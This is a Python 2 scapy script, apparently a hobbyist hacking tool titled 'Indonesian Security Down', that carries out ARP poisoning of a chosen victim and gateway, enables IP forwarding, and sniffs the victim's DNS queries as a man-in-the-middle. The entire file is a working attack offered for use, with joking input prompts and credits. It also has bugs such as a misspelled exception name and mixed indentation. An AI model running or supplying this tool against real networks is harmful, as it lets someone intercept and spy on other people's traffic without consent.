#!/usr/bin/env python

from scapy.all import *
import threading
import os
import sys
	
# Indonesian Security Down, ARP poison , dns MITM 
# Crunch_404 -->
# COULD DO WITH SOME MORE ERROR HANDLING MAYBE A SERVER FUNCTION TO SERVE YOUR OWN PAGES	
# ALSO POSSIBLY AN SSL STRIP FUNCTION 
# CTRL_Z KILL ADDED (setDaemon(True))
print '..=|| Indonesian Security Down ||=.. '
print '         ..||Crunch_404||.. '
VIP = raw_input('Please write ure love address: ')
GW = raw_input('Please write in the door what u feel: ')
IFACE = raw_input('Please write u walk give a love: ')
print '\nMake sure you are handsome !, and enjoy. '

print '\t\t\nLoading n Salam Tamvan maksimal :) ! .. '
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them

def dnshandle(pkt):
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
			print 'Love_U: ' + VIP + ' has searched for: ' + pkt.getlayer(DNS).qd.qname


def v_poison():
	v = ARP(pdst=VIP, psrc=GW)
	while True:
		try:	
		       send(v,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
			 sys.exit(1)
def gw_poison():
	gw = ARP(pdst=GW, psrc=VIP)
	while True:
		try:
		       send(gw,verbose=0,inter=1,loop=1)
		except KeyboardInterupt:
			sys.exit(1)

vthread = []
gwthread = []	

 
while True:	# Threads 
		
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()		
        
	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	
	pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)
